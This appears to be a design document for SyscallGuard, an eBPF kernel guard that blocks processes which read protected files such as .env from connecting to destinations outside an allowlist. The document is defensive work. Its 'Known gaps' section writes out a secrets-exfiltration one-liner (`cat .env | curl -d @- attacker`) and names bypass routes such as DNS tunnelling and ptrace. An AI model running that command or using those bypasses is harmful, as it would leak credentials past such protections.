# SyscallGuard Architecture

The rule: **a process that read a protected file may only connect to destinations on the allowlist. Everything else is blocked in the kernel.**

## Components

```
 HOST LAPTOP (Fedora)                         VM (Fedora, BPF LSM)  ← the protected server
 ┌──────────────────────────┐                ┌─────────────────────────────────────────┐
 │ Electron dashboard ──────┼── ws:8765 ───▶ │ bridge.py  ◀── stdin ── guard.py (root) │
 │ attacker.py :9999 ◀──────┼── ✖ blocked ── │ agent.py ──▶ internal_api.py :8080 (ok) │
 │ terminal (ssh into VM)   │                │ kernel: hooks A–E + maps + ring buffer  │
 └──────────────────────────┘                └─────────────────────────────────────────┘
        attacker reachable from the VM at the libvirt gateway (usually 192.168.122.1)
```

## Data flow

```
policy.toml ─▶ guard.py ─fills─▶ BPF maps
                                    │
          kernel hooks A–E decide ◀─┘
                    │ sg_event
                    ▼
               ring buffer ─▶ guard.py decodes ─JSON lines─▶ bridge.py (state + broadcast) ─ws─▶ Electron renderer
```

## Process model

| Process | Runs on | User | Ports |
|---|---|---|---|
| `guard.py` | VM | root (`sudo`) | none; writes JSON to stdout, logs to stderr |
| `bridge.py` | VM (or anywhere with `--fake`) | unprivileged | listens TCP 8765 (WebSocket) |
| Electron dashboard | host laptop | unprivileged | connects out to bridge :8765 |
| `agent.py` | VM | unprivileged (the untrusted code) | connects to :8080 and the attacker |
| `internal_api.py` | VM | unprivileged | listens 127.0.0.1:8080 |
| `attacker.py` | host laptop | unprivileged | listens 0.0.0.0:9999 TCP + UDP |

Firewall: on the host, `sudo firewall-cmd --zone=libvirt --add-port=9999/tcp --add-port=9999/udp`; in the VM, `sudo firewall-cmd --add-port=8765/tcp`.

The bridge accepting the dashboard's connection is unaffected by the guard: the bridge is never tagged.

## Hooks

| ID | Attach point (bcc macro) | Logic |
|---|---|---|
| A | `LSM_PROBE(file_open, struct file *file)` | `ino = file->f_inode->i_ino`. If `ino` in `protected_inodes`, then upsert `tagged[tgid] = {now, ino, 0}` and emit `TAG`. Always `return 0` (never deny opens). |
| B | `LSM_PROBE(socket_connect, struct socket *sock, struct sockaddr *address, int addrlen)` | Run `check_dest(family, addr, port, SG_HOOK_CONNECT)` on the address being connected to. Hook B is the only hook that emits `ALLOW`. |
| C | `LSM_PROBE(socket_sendmsg, struct socket *sock, struct msghdr *msg, int size)` | If `msg->msg_name` is non-NULL, the destination is that sockaddr (UDP `sendto`, TCP Fast Open). Otherwise use the connected peer from `sock->sk->__sk_common` (`skc_family`, `skc_daddr` / `skc_v6_daddr`, `skc_dport`). Unconnected with no address → return 0. Then `check_dest(...)`. Never emits `ALLOW`: an allowed send is silent; a disallowed one emits `WOULD_BLOCK` or `BLOCK`. |
| D | `RAW_TRACEPOINT_PROBE(sched_process_fork)` | `parent = ctx->args[0]`, `child = ctx->args[1]` (`struct task_struct *`). Read `parent->tgid` and `child->tgid`. If they differ (a new process, not a thread) and the parent tgid is in `tagged`, insert `tagged[child_tgid] = {now, parent.ino, parent_tgid}` and emit `TAG_INHERIT`. |
| E | `TRACEPOINT_PROBE(sched, sched_process_exit)` | `pid_tgid = bpf_get_current_pid_tgid()`. If `pid == tgid` (thread-group leader) and the tgid is in `tagged`, delete it and emit `UNTAG`. |

## Decision logic

```
check_dest(family, addr, port, hook):
    cfg = config[0];  if cfg missing → return 0
    tgid = bpf_get_current_pid_tgid() >> 32
    tag  = tagged.lookup(tgid);  if !tag → return 0           # fast path: untagged
    if family == AF_INET6 and addr is ::ffff:a.b.c.d → family = AF_INET, addr = a.b.c.d
    if family not in {AF_INET, AF_INET6} → return 0           # AF_UNIX etc. are a known gap
    if allow_v4/allow_v6 LPM lookup (prefixlen 32/128) hits → emit ALLOW only if hook == SG_HOOK_CONNECT; return 0
    if cfg.mode == AUDIT → emit WOULD_BLOCK; return 0
    emit BLOCK; return -EPERM
```

Implementation notes (Track K):

- Key `tagged` by **TGID** (`bpf_get_current_pid_tgid() >> 32`), never by thread id.
- No pass-through of earlier LSM verdicts is needed. The LSM framework stops at the first denial, so if SELinux denies, our program never runs.
- Use `bpf_probe_read_kernel()` for pointer chasing whenever bcc's automatic rewriting is unclear (`sockaddr`, `msghdr`, `sk_common`).
- Prefer `events.ringbuf_reserve()` + `ringbuf_submit()` to keep the event off the 512-byte stack.
- Fill `comm` with `bpf_get_current_comm()`.
- Hooks B and C fire on every connect/send on the system. Keep the untagged path to a single map lookup.
- `guard.py` loads the program with `BPF(src_file=..., cflags=["-I<abs path to guard/bpf>"])`. LSM, tracepoint and raw-tracepoint probes auto-attach when bcc loads them.

---

# The four contracts

These are the interfaces between tracks. Change them only with a `contract:` commit that updates this file and `guard/bpf/sg_common.h` together.

## Contract 1: Kernel structs and maps (`guard/bpf/sg_common.h`)

```c
#ifndef SG_COMMON_H
#define SG_COMMON_H

/* event types */
#define SG_EV_TAG          1
#define SG_EV_TAG_INHERIT  2
#define SG_EV_ALLOW        3
#define SG_EV_BLOCK        4
#define SG_EV_WOULD_BLOCK  5
#define SG_EV_UNTAG        6

/* hooks */
#define SG_HOOK_NONE       0
#define SG_HOOK_FILE_OPEN  1
#define SG_HOOK_CONNECT    2
#define SG_HOOK_SENDMSG    3
#define SG_HOOK_FORK       4
#define SG_HOOK_EXIT       5

/* modes (config map) */
#define SG_MODE_AUDIT      1
#define SG_MODE_ENFORCE    2

struct sg_tag_info {
    u64 ts_ns;          /* when tagged (bpf_ktime_get_ns) */
    u64 ino;            /* inode of the protected file that caused the tag */
    u32 parent_tgid;    /* 0 if tagged directly, else the tgid it inherited from */
    u32 _pad;
};

struct sg_event {
    u64 ts_ns;
    u64 ino;            /* protected file inode (from tag info), 0 if n/a */
    u32 type;           /* SG_EV_* */
    u32 hook;           /* SG_HOOK_* */
    u32 tgid;
    u32 parent_tgid;    /* TAG_INHERIT only */
    u16 family;         /* AF_INET=2, AF_INET6=10, 0 if n/a */
    u16 dport;          /* host byte order */
    u8  daddr[16];      /* IPv4 in first 4 bytes, network order */
    char comm[16];
};

struct sg_config { u32 mode; };

struct sg_lpm_v4 { u32 prefixlen; u8 addr[4]; };
struct sg_lpm_v6 { u32 prefixlen; u8 addr[16]; };

#endif
```

Maps (declared in `syscallguard.bpf.c`; the names are part of the contract because `guard.py` looks them up):

| Name | bcc declaration | Written by |
|---|---|---|
| `protected_inodes` | `BPF_HASH(protected_inodes, u64, u32, 256)` | guard.py at startup (value = index into policy `protect` list) |
| `tagged` | `BPF_HASH(tagged, u32, struct sg_tag_info, 16384)` | hooks A, D (insert), E (delete) |
| `allow_v4` | `BPF_LPM_TRIE(allow_v4, struct sg_lpm_v4, u8, 1024)` | guard.py |
| `allow_v6` | `BPF_LPM_TRIE(allow_v6, struct sg_lpm_v6, u8, 1024)` | guard.py |
| `config` | `BPF_ARRAY(config, struct sg_config, 1)` | guard.py |
| `events` | `BPF_RINGBUF_OUTPUT(events, 64)` (64 pages) | all hooks |

## Contract 2: Policy file (`policy/policy.example.toml`)

```toml
# SyscallGuard policy
# mode: "audit" logs WOULD_BLOCK without blocking. "enforce" blocks. Default to audit.
mode = "audit"

# Files whose readers get tagged. Absolute paths. Must exist at startup.
protect = [
  "/home/demo/syscallguard/demo/project/.env",
]

# Destinations a tagged process may still reach. CIDR. IPv4 and IPv6.
# Loopback must stay allowed: the internal API mock and the DNS stub (127.0.0.53) live there.
allow = [
  "127.0.0.0/8",
  "::1/128",
]
```

Parsing (`guard/policy.py`): use `tomllib`. Validate that `mode` ∈ {audit, enforce}; that every `protect` path is absolute and exists (`os.stat`, which follows symlinks, so we protect the real file); and that every `allow` entry parses with `ipaddress.ip_network(strict=False)`. On any error, print a clear message to stderr and exit 2. A CLI `--mode` flag overrides the file. A missing `mode` means `audit`. `protect` must be non-empty; `allow` may be empty (a tagged process then reaches nothing, useful for testing). Unknown keys are rejected. Map-size limits are not checked.

A missing allow key is treated as empty (most restrictive reading).
A missing protect key is rejected, same as an empty one.
allow entries must be strings. Non-string entries are rejected — an integer like 5 would otherwise silently become 0.0.0.5/32.

## Contract 3: Guard CLI and JSON event schema (stdout of `guard.py`)

```
sudo python3 guard/guard.py -p policy/policy.toml [--mode audit|enforce] [--debug]
```

- Loads the BPF program, fills `protected_inodes` (`st_ino`), `allow_v4`/`allow_v6` and `config`, emits `READY`, then polls the ring buffer forever.
- On SIGINT/SIGTERM, exits cleanly. All hooks detach when the process exits; this is the safety valve.
- Exit codes: `0` clean shutdown on SIGINT/SIGTERM, `2` bad policy, `3` BPF load failure (an `ERROR` event is written to stdout first). `--debug` only adds verbose logging on stderr.
- **Stdout = one JSON object per line, flushed after each line.** Nothing else goes to stdout.

```json
{"v":1,"ts":1760600000.123,"type":"BLOCK","hook":"connect","tgid":4421,"parent_tgid":null,
 "comm":"curl","file":"/home/demo/syscallguard/demo/project/.env",
 "family":"ipv4","daddr":"192.168.122.1","dport":9999,"mode":"enforce"}
```

| Field | Type | Notes |
|---|---|---|
| `v` | int | schema version, `1` |
| `ts` | float | Unix epoch seconds (convert from `ts_ns` using boot-time offset) |
| `type` | string | `READY` `TAG` `TAG_INHERIT` `ALLOW` `BLOCK` `WOULD_BLOCK` `UNTAG` `ERROR` |
| `hook` | string or null | `file_open` `connect` `sendmsg` `fork` `exit` |
| `tgid`, `parent_tgid` | int or null | |
| `comm` | string or null | process name; `null` on `READY`/`ERROR`. On `TAG_INHERIT` it is the name at fork time (usually the parent's); consumers must not rely on it |
| `file` | string or null | protected path resolved from `ino` |
| `family` | `"ipv4"`/`"ipv6"`/null | |
| `daddr` | string or null | formatted with `ipaddress` |
| `dport` | int or null | |
| `mode` | string | current mode |

The `READY` event also carries `"protect": [...]` and `"allow": [...]`. The `ERROR` event carries `"message": "..."`.

## Contract 4: Bridge WebSocket protocol (`bridge/bridge.py`)

```
sudo python3 guard/guard.py -p policy/policy.toml | python3 bridge/bridge.py --host 0.0.0.0 --port 8765
python3 bridge/bridge.py --fake --port 8765        # no kernel, any OS
```

- Reads JSON lines from stdin (or generates them in `--fake` mode) and broadcasts each one, unchanged, to every connected WebSocket client.
- Keeps state: mode, protect, allow, the current tagged set (add on `TAG`/`TAG_INHERIT`, remove on `UNTAG`), and the last 50 events.
- When a client connects, it first sends:
  ```json
  {"v":1,"type":"SNAPSHOT","mode":"enforce","guard_connected":true,"protect":[...],"allow":[...],
   "tagged":[{"tgid":4421,"comm":"python3","file":"...","since":1760600000.1,"parent_tgid":null}],
   "recent":[ ...last 50 events... ]}
  ```
  So a dashboard that restarts mid-demo recovers its full state.
- `--fake` loops a realistic story every ~10 s: `READY` → `TAG` (python3) → `ALLOW` 127.0.0.1:8080 → `TAG_INHERIT` (comm `python3`, the name at fork) → `BLOCK` (comm `curl`) 192.168.122.1:9999 → `UNTAG`.
- Guard state: the bridge sends `{"v":1,"type":"GUARD_STATE","connected":false}` to every client on stdin EOF (guard gone). It stays `false`: stdin can't reopen, so restarting the guard means restarting the whole `guard.py | bridge.py` pipeline, and the new bridge starts with `true`. `SNAPSHOT` carries the current value as `"guard_connected"`. `--fake` always reports `true`. `GUARD_STATE` is a bridge message, not a guard event, so it is not added to `recent`.
- Read-only feed. Ignore messages from clients.
- Never imports `bcc`. Runs unprivileged.
- `--host` defaults to `127.0.0.1` (pass `0.0.0.0` in the VM). A malformed stdin line is skipped and logged to stderr. A repeat `TAG` for an already-tagged tgid keeps its original `since`. Before `READY` arrives, `SNAPSHOT.mode` is `null`. On stdin EOF (guard gone) the bridge keeps running, serves the last state, and sends `GUARD_STATE` (below).

---

## Dashboard (Track U)

- `main.js`: one `BrowserWindow`, `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`. Supports `--kiosk`/fullscreen. Bridge URL from `SG_BRIDGE_URL` env var or `--bridge=ws://...` (default `ws://127.0.0.1:8765`), passed to the renderer via `preload.js` (`contextBridge`).
- The renderer opens the WebSocket itself. Content-Security-Policy allows `connect-src ws: wss:` and nothing remote otherwise.
- The renderer also works opened directly in a browser: with no preload value it reads `?bridge=` from the URL.
- Panels: status banner (green "Protected"; red for 5 s on `BLOCK`; amber on `WOULD_BLOCK`), tagged processes, event log (newest first), policy panel, two connection indicators: bridge reachable (auto-reconnect every 2 s) and guard feeding (`GUARD_STATE`).
- Readable from 1.5 m: large type, high contrast, dark theme. Show real fields only.

## Design decisions

| Decision | Why |
|---|---|
| Kernel LSM hooks, not app-level checks | Untrusted code can't bypass a check made after the syscall enters the kernel |
| Tag processes (TGID), not bytes | Achievable in time; encoding/ports/protocols don't matter. Byte tracking is future work |
| Fork inheritance | Agents spawn helpers (`curl`); without it the core demo fails |
| `socket_sendmsg` hook in addition to `connect` | Covers UDP `sendto` and "connect before reading" |
| Inode matching, not path strings | String compare in eBPF is costly and paths have aliases. Accepted risk: inode collisions across filesystems |
| LPM tries for the allowlist | CIDR ranges in one lookup |
| Audit mode is the default | A bad policy can't cut off the machine during development |
| Guard and bridge are separate processes | Only the guard needs root; the bridge and dashboard can be built and tested anywhere with `--fake` |
| Electron renderer is plain HTML/JS | It also runs in a normal browser, which is the stage fallback if Electron breaks |

## Known gaps

- Sibling pipelines: `cat .env | curl -d @- attacker`
- Writing the secret to a file that another, untagged process sends later
- Exfil to an allowlisted destination
- DNS tunnelling through the allowed local resolver
- `AF_UNIX` / local IPC relays
- `ptrace` into untagged processes
- Root attackers
- A process whose thread-group leader exits while worker threads keep running (tag removed early)
